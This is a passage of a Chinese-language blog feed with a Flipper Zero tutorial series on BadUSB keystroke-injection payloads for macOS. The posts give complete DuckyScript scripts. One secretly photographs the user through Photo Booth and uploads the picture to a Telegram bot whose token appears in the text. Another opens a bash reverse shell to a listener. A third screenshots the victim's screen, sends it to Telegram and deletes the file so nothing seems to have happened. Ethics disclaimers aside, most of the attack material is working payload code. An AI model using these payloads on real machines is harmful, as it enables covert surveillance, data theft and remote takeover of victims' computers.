&quot;System Events&quot; to keystroke return&#x27; -e &#x27;delay 2&#x27;</span><br><span class="line">ENTER</span><br><span class="line">DELAY 3500  REM Wait for Photo Booth to take the photo and save it</span><br><span class="line"></span><br><span class="line">REM Open Spotlight</span><br><span class="line">GUI SPACE</span><br><span class="line">DELAY 500</span><br><span class="line">REM Type &#x27;iTerm&#x27; to open iTerm</span><br><span class="line">STRING iTerm</span><br><span class="line">DELAY 500</span><br><span class="line">ENTER</span><br><span class="line">DELAY 1000</span><br><span class="line"></span><br><span class="line">REM Find the most recent Photo Booth photo</span><br><span class="line">STRING cd ~/Pictures/Photo\ Booth\ Library/Pictures/</span><br><span class="line">ENTER</span><br><span class="line">DELAY 500</span><br><span class="line">STRING latest_photo=$(ls -t | head -n1)</span><br><span class="line">ENTER</span><br><span class="line">DELAY 500</span><br><span class="line"></span><br><span class="line">REM Send the photo to the Telegram bot</span><br><span class="line">STRING curl -s -X POST -F chat_id=&lt;your_chat_id&gt; -F photo=@\&quot;$latest_photo\&quot; https://api.telegram.org/bot7580842046:AAEKmOz8n3C265m2_XSv8cGFbBHg7mcnbMM/sendPhoto</span><br><span class="line">ENTER</span><br><span class="line">DELAY 5000</span><br><span class="line"></span><br><span class="line">REM Optionally, close Photo Booth if you want to clean up after the action</span><br><span class="line">STRING osascript -e &#x27;tell application &quot;Photo Booth&quot; to quit&#x27;</span><br><span class="line">DELAY 500</span><br><span class="line">ENTER</span><br><span class="line">DELAY 500</span><br><span class="line"></span><br><span class="line">REM Close iTerm</span><br><span class="line">DELAY 500</span><br><span class="line">GUI Q</span><br><span class="line">ENTER</span><br></pre></td></tr></table></figure></div><p>執行成功，各位就回去自己試試吧，這邊不放我的醜照了w</p><h2 id="按讚訂閱收藏小鈴噹叮叮叮"><a href="#按讚訂閱收藏小鈴噹叮叮叮" class="headerlink" title="按讚訂閱收藏小鈴噹叮叮叮"></a>按讚訂閱收藏小鈴噹叮叮叮</h2><p>BadUSB 的介紹就差不多到這邊，大家要注意的是很多我們測試的功能都不是預設終端會有的，所以大家不要想做壞壞的是R，那各位就明天見了，88。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;昨天的文章發出去之後就問問戰隊的人有沒有什麼有趣的 BadUSB 應用，於是就有了以下的對話：&lt;br&gt;&lt;img  
            </summary>
      
    
    
    
    
    <category term="flipper-zero" scheme="https://kazma.tw/tags/flipper-zero/"/>
    
    <category term="iThome" scheme="https://kazma.tw/tags/iThome/"/>
    
    <category term="toy" scheme="https://kazma.tw/tags/toy/"/>
    
  </entry>
  
  <entry>
    <title>Flipper Zero 宇宙最強攻略：30 天帶你從入門到入坑 Day18 - 神隱少年：悄無聲息的透過 BadUSB 遠端截圖至你的 TG BOT！</title>
    <link href="https://kazma.tw/2024/10/02/Flipper-Zero-%E5%AE%87%E5%AE%99%E6%9C%80%E5%BC%B7%E6%94%BB%E7%95%A5%EF%BC%9A30-%E5%A4%A9%E5%B8%B6%E4%BD%A0%E5%BE%9E%E5%85%A5%E9%96%80%E5%88%B0%E5%85%A5%E5%9D%91-Day18-%E7%A5%9E%E9%9A%B1%E5%B0%91%E5%B9%B4%EF%BC%9A%E6%82%84%E7%84%A1%E8%81%B2%E6%81%AF%E7%9A%84%E9%80%8F%E9%81%8E-BadUSB-%E9%81%A0%E7%AB%AF%E6%88%AA%E5%9C%96%E8%87%B3%E4%BD%A0%E7%9A%84-TG-BOT%EF%BC%81/"/>
    <id>https://kazma.tw/2024/10/02/Flipper-Zero-%E5%AE%87%E5%AE%99%E6%9C%80%E5%BC%B7%E6%94%BB%E7%95%A5%EF%BC%9A30-%E5%A4%A9%E5%B8%B6%E4%BD%A0%E5%BE%9E%E5%85%A5%E9%96%80%E5%88%B0%E5%85%A5%E5%9D%91-Day18-%E7%A5%9E%E9%9A%B1%E5%B0%91%E5%B9%B4%EF%BC%9A%E6%82%84%E7%84%A1%E8%81%B2%E6%81%AF%E7%9A%84%E9%80%8F%E9%81%8E-BadUSB-%E9%81%A0%E7%AB%AF%E6%88%AA%E5%9C%96%E8%87%B3%E4%BD%A0%E7%9A%84-TG-BOT%EF%BC%81/</id>
    <published>2024-10-02T15:55:25.532Z</published>
    <updated>2024-10-29T09:45:04.422Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天要來跟大家介紹一些有趣的 BadUSB 應用，我們會嘗試從受害者的電腦取得 revereshell，以及我們今天還會嘗試從受害者的電腦截圖傳給我們的 tg bot 然後刪除截圖假裝什麼都沒發生，趕緊來看看。</p><h2 id="資安倫理宣導"><a href="#資安倫理宣導" class="headerlink" title="資安倫理宣導"></a>資安倫理宣導</h2><p>請注意，透過 Flipper Zero 學習的資訊技術與知識，目的在於提升個人的技術能力和資安意識。我們強烈呼籲大家，絕對不要使用所學知識從事任何違法行為。您的合法使用是我們的期望，也是您自身責任的一部分。</p><h2 id="Reverse-Shell"><a href="#Reverse-Shell" class="headerlink" title="Reverse Shell"></a>Reverse Shell</h2><p>首先我們要先在駭客的電腦上監聽某個 port，如下：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└─$ nc -lvnp 8787</span><br><span class="line">listening on [any] 8787 ...</span><br></pre></td></tr></table></figure></div><p>然後我們撰寫一個 Flipper BadUSB 的腳本如下：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">REM Initial delay to allow the OS to recognize the device</span><br><span class="line">DELAY 500</span><br><span class="line"></span><br><span class="line">REM Use Spotlight to open Terminal</span><br><span class="line">GUI SPACE</span><br><span class="line">DELAY 500</span><br><span class="line">STRING Terminal</span><br><span class="line">DELAY 500</span><br><span class="line">ENTER</span><br><span class="line">DELAY 1000</span><br><span class="line"></span><br><span class="line">REM Open bash</span><br><span class="line">STRING bash</span><br><span class="line">DELAY 500</span><br><span class="line">ENTER</span><br><span class="line"></span><br><span class="line">REM Type the reverse shell command</span><br><span class="line">STRING bash -i &gt;&amp; /dev/tcp/[IP]/[Port] 0&gt;&amp;1</span><br><span class="line">ENTER</span><br></pre></td></tr></table></figure></div><p>我們的腳本是針對 mac 的用戶，我們透過 Spotlight 先打開 terminal 然後進到 bash，之後輸入 <code>bash -i &gt;&amp; /dev/tcp/[IP]/[Port] 0&gt;&amp;1</code>，就會看到駭客的監聽畫面有變化了，如下：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/reverseDemo.png"                      alt="demo"                ></p><p>成功！</p><h2 id="TelegramBot"><a href="#TelegramBot" class="headerlink" title="TelegramBot"></a>TelegramBot</h2><p>接著我們來嘗試搭配 TG Bot 傳一些受害者的資料到我們的機器人，例如截圖他的螢幕看看他在幹嘛之類的。<br>首先我們去 Telegram 搜尋 @BotFather 接著輸入 <code>/newbot</code> 創建一個新的機器人，然後取好名字跟 username，然後 &#x2F;token 產生一個 token，我們就可以去記錄聊天室的資訊，這時我們可以去私訊我們的機器人測試一下順便紀錄下這個私訊的 id，然後我們先測試一下我們能不能執行一個腳本從受害者的電腦傳訊息到我們的機器人，腳本如下(大家記得改成自己的)：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">REM Open Spotlight and type Terminal</span><br><span class="line">GUI SPACE</span><br><span class="line">DELAY 500</span><br><span class="line">STRING Terminal</span><br><span class="line">DELAY 500</span><br><span class="line">ENTER</span><br><span class="line">DELAY 1000</span><br><span class="line"></span><br><span class="line">REM Type the command to send message to Telegram bot</span><br><span class="line">STRING curl -s -X POST https://api.telegram.org/bot&lt;YourBOTToken&gt;/sendMessage -d chat_id=&lt;chat_id&gt; -d text=&quot;Hello from BadUSB&quot;</span><br><span class="line">ENTER</span><br><span class="line">DELAY 500</span><br><span class="line">STRING exit</span><br><span class="line">ENTER</span><br></pre></td></tr></table></figure></div><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/hellofrombadUSB.png"                      alt="hello"                ><br>成功！<br>接著我們嘗試從受害者的電腦截圖後傳給我們的機器人然後刪除我們的截圖假裝什麼都沒發生，腳本如下，記得換成你們的 token 跟 id：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">REM Open Spotlight and type Terminal</span><br><span class="line">GUI SPACE</span><br><span class="line">DELAY 500</span><br><span class="line">STRING Terminal</span><br><span class="line">DELAY 500</span><br><span class="line">ENTER</span><br><span class="line">DELAY 1000</span><br><span class="line"></span><br><span class="line">REM Get the username and take a screenshot</span><br><span class="line">STRING username=$(whoami) &amp;&amp; screencapture /Users/$username/Desktop/screenshot.png</span><br><span class="line">ENTER</span><br><span class="line">DELAY 1000</span><br><span class="line"></span><br><span class="line">REM Send the screenshot to the Telegram bot</span><br><span class="line">STRING curl -s -X POST -F &quot;chat_id=&lt;chat_id&gt;&quot; -F &quot;photo=@\&quot;/Users/$username/Desktop/screenshot.png\&quot;&quot; https://api.telegram.org/bot&lt;token&gt;/sendPhoto</span><br><span class="line">ENTER</span><br><span class="line">DELAY 1000</span><br><span class="line"></span><br><span class="line">REM Clean up by removing the screenshot and closing Terminal</span><br><span class="line">STRING rm /Users/$username/Desktop/screenshot.png</span><br><span class="line">ENTER</span><br><span class="line">DELAY 500</span><br><span class="line">STRING exit</span><br><span class="line">ENTER</span><br></pre></td></tr></table></figure></div><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/badscreenshot.png"                      alt="badscreen"                ><br>成功！！！</p><h2 id="按讚訂閱收藏小鈴噹叮叮叮"><a href="#按讚訂閱收藏小鈴噹叮叮叮" class="headerlink" title="按讚訂閱收藏小鈴噹叮叮叮"></a>按讚訂閱收藏小鈴噹叮叮叮</h2><p>今天的內容也是我剛剛花一個半小時邊嘗試邊撰寫的結果，還好有順利成功，歡迎大家跟我分享有什麼有趣的 BadUSB 應用，我們可以一起來玩玩，但呼籲各位是透過 Flipper 來學習，不要真的去做壞駭客。<br>各位明天見，敬請期待！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;今天要來跟大家介紹一些有趣的 BadUSB 應用，我們會嘗試從受害者的電腦取得 revereshell，以及我們今天還會嘗試從受害者的電腦截</summary>
      
    
    
    
    
    <category term="flipper-zero" scheme="https://kazma.tw/tags/flipper-zero/"/>
    
    <category term="iThome" scheme="https://kazma.tw/tags/iThome/"/>
    
    <category term="toy" scheme="https://kazma.tw/tags/toy/"/>
    
  </entry>
  
  <entry>
    <title>Flipper Zero 宇宙最強攻略：30 天帶你從入門到入坑 Day17 - Flipper Zero の遠程攻擊：Bad Bluetooth 無線控制術</title>
    <link href="https://kazma.tw/2024/10/01/Flipper-Zero-%E5%AE%87%E5%AE%99%E6%9C%80%E5%BC%B7%E6%94%BB%E7%95%A5%EF%BC%9A30-%E5%A4%A9%E5%B8%B6%E4%BD%A0%E5%BE%9E%E5%85%A5%E9%96%80%E5%88%B0%E5%85%A5%E5%9D%91-Day17-Flipper-Zero-%E3%81%AE%E9%81%A0%E7%A8%8B%E6%94%BB%E6%93%8A%EF%BC%9ABad-Bluetooth-%E7%84%A1%E7%B7%9A%E6%8E%A7%E5%88%B6%E8%A1%93/"/>
    <id>https://kazma.tw/2024/10/01/Flipper-Zero-%E5%AE%87%E5%AE%99%E6%9C%80%E5%BC%B7%E6%94%BB%E7%95%A5%EF%BC%9A30-%E5%A4%A9%E5%B8%B6%E4%BD%A0%E5%BE%9E%E5%85%A5%E9%96%80%E5%88%B0%E5%85%A5%E5%9D%91-Day17-Flipper-Zero-%E3%81%AE%E9%81%A0%E7%A8%8B%E6%94%BB%E6%93%8A%EF%BC%9ABad-Bluetooth-%E7%84%A1%E7%B7%9A%E6%8E%A7%E5%88%B6%E8%A1%93/</id>
    <published>2024-10-01T15:56:46.818Z</published>
    <updated>2024-10-01T15:59:22.829Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Bad-USB"><a href="#Bad-USB" class="headerlink" title="Bad USB"></a>Bad USB</h2><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://cdn.flipperzero.one/Bad_USB.png"                      alt="cover"                ><br>圖片來源：<a class="link"   href="https://docs.flipper.net/bad-usb" >https://docs.flipper.net/bad-usb <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>今天我們要來介紹 Flipper 最有趣也是變化最多元的功能之一。<br>Flipper Zero 可以作為 BadUSB 裝置，被電腦識別為人機介面裝置（HID），例如鍵盤。BadUSB 裝置可以更改系統設置、開啟後門、檢索資料、reverse shell，或基本上執行任何可以通過實體訪問實現的操作。這是通過執行一組用橡皮鴨腳本語言（也稱為 DuckyScript）編寫的命令來完成的。這組命令也被稱為 payload。<br>今天我們就來好好介紹這個功能吧～</p><h2 id="資安倫理宣導"><a href="#資安倫理宣導" class="headerlink" title="資安倫理宣導"></a>資安倫理宣導</h2><p>請注意，透過 Flipper Zero 學習的資訊技術與知識，目的在於提升個人的技術能力和資安意識。我們強烈呼籲大家，絕對不要使用所學知識從事任何違法行為。您的合法使用是我們的期望，也是您自身責任的一部分。</p><h2 id="Flipper-Zero-scripting-language"><a href="#Flipper-Zero-scripting-language" class="headerlink" title="Flipper Zero scripting language"></a>Flipper Zero scripting language</h2><p>在使用 Flipper Zero 作為 BadUSB 裝置之前，我們需要使用腳本語言在任何常用的 ASCII 文本編輯器中以 .txt 格式編寫 payload。Flipper Zero 可以執行擴展的橡皮鴨腳本語法。這種語法跟經典的 DuckyScript 1.0 兼容，但提供了額外的命令和功能，如 ALT + Numpad 輸入法、SysRq 命令等。</p><h2 id="Uploading-new-payloads-to-Flipper-Zero"><a href="#Uploading-new-payloads-to-Flipper-Zero" class="headerlink" title="Uploading new payloads to Flipper Zero"></a>Uploading new payloads to Flipper Zero</h2><p>我們可以透過 qFlipper 或是 Flipper Mobile App 把寫好的腳本丟到 <code>SD Card/badusb/</code> 的路徑下，之後就可以從 Flipper 執行這些檔案了。</p><h2 id="Using-your-Flipper-Zero-as-a-BadUSB-device"><a href="#Using-your-Flipper-Zero-as-a-BadUSB-device" class="headerlink" title="Using your Flipper Zero as a BadUSB device"></a>Using your Flipper Zero as a BadUSB device</h2><p>我們執行腳本的方式有兩種，步驟各自如下：</p><h3 id="Via-USB-connection"><a href="#Via-USB-connection" class="headerlink" title="Via USB connection"></a>Via USB connection</h3><p>首先我們關掉 qFlipper 然後到 Main Menu -&gt; Bad USB，選擇要執行的腳本按下 OK 接著透過 USB 線接上電腦就可以執行腳本了。</p><h3 id="Via-BLE-сonnection"><a href="#Via-BLE-сonnection" class="headerlink" title="Via BLE сonnection"></a>Via BLE сonnection</h3><p>比較特別的是藍芽的功能，首先我們到 Main Menu -&gt; Settings -&gt; Bluetooth 打開藍牙的設定，然後關掉 qFlipper 之後到 Main Menu -&gt; Bad USB 選擇要執行的腳本，然後到 Config 選擇 BLE 之後只要電腦連上 Flipper 的藍芽就會自動執行腳本了，雖然會跑出配對畫面但是直接按 OK 不用真的配對。</p><h2 id="RickRoll-Example"><a href="#RickRoll-Example" class="headerlink" title="RickRoll Example"></a>RickRoll Example</h2><p>這邊我們透過寫一個 rickroll 腳本來示範 BadUSB 的功能：<br>首先 <code>REM</code> 代表的是註解，所以剛開始我們先透過一秒的 delay 確定系統有偵測到鍵盤，接著我們嘗試模仿 Mac 打該 Spotlight 的方式 Command + SPACE，而 Command 在 duckyscript 裡面是 <code>GUI</code>，然後我們透過 <code>STRING</code> 輸入 Safari 的字串嘗試打開 Mac 預設安裝的瀏覽器，然後搭配上一些暫停確定指令不會輸入過快，接著就是透過打開新視窗並且輸入網址然後按下空白鍵開始播放，有時候如果有些人的網速比較慢可以把等待時間拉久一點再按播放。</p><p>然後在測試的過程中搭配一些線上的按鍵工具 debug 發現 duckyscript 沒辦法執行兩個以上的組合鍵。<br>腳本如下：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">REM Initial delay to ensure the system detects the keyboard</span><br><span class="line">DELAY 1000</span><br><span class="line"></span><br><span class="line">REM Open Spotlight</span><br><span class="line">GUI SPACE</span><br><span class="line">DELAY 500</span><br><span class="line"></span><br><span class="line">REM Type &#x27;Safari&#x27; and open it</span><br><span class="line">STRING Safari</span><br><span class="line">DELAY 500</span><br><span class="line">ENTER</span><br><span class="line">DELAY 1000</span><br><span class="line"></span><br><span class="line">REM Open a new tab (if Safari wasn&#x27;t already open to a blank page)</span><br><span class="line">GUI t</span><br><span class="line">ALT GUI F</span><br><span class="line">DELAY 500</span><br><span class="line"></span><br><span class="line">REM Go to YouTube and play a specific video</span><br><span class="line">STRING https://youtube.com/shorts/fDzjcDqJ0Ig?si=NwoL1eUm1tM-wiGh</span><br><span class="line">DELAY 500</span><br><span class="line">ENTER</span><br><span class="line">DELAY 4000  REM Wait for the page to load</span><br><span class="line"></span><br><span class="line">REM Simulate pressing space if needed to play the video</span><br><span class="line">SPACE</span><br></pre></td></tr></table></figure></div><h2 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h2><p>我們用藍芽示範給大家看，首先我們把名稱偽裝成我常用的耳機：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/bt.png"                      alt="bt"                ><br>然後在出現配對畫面的時候直接按 OK 就可以了。<br>效果如下：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/demo2.png"                      alt="demo"                ><br>成功！</p><h2 id="按讚訂閱收藏小鈴噹叮叮叮"><a href="#按讚訂閱收藏小鈴噹叮叮叮" class="headerlink" title="按讚訂閱收藏小鈴噹叮叮叮"></a>按讚訂閱收藏小鈴噹叮叮叮</h2><p>今天我們學到了如何把 Flipper 當作 BadUSB 的工具，而且也實際的寫了一個 rickroll 的腳本，明天我們會來寫看看其他 BadUSB 的應用，各位敬請期待！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Bad-USB&quot;&gt;&lt;a href=&quot;#Bad-USB&quot; class=&quot;headerlink&quot; title=&quot;Bad USB&quot;&gt;&lt;/a&gt;Bad USB&lt;/h2&gt;&lt;p&gt;&lt;img  
                     lazyload
             </summary>
      
    
    
    
    
    <category term="flipper-zero" scheme="https://kazma.tw/tags/flipper-zero/"/>
    
    <category term="iThome" scheme="https://kazma.tw/tags/iThome/"/>
    
    <category term="toy" scheme="https://kazma.tw/tags/toy/"/>
    
  </entry>
  
</feed>
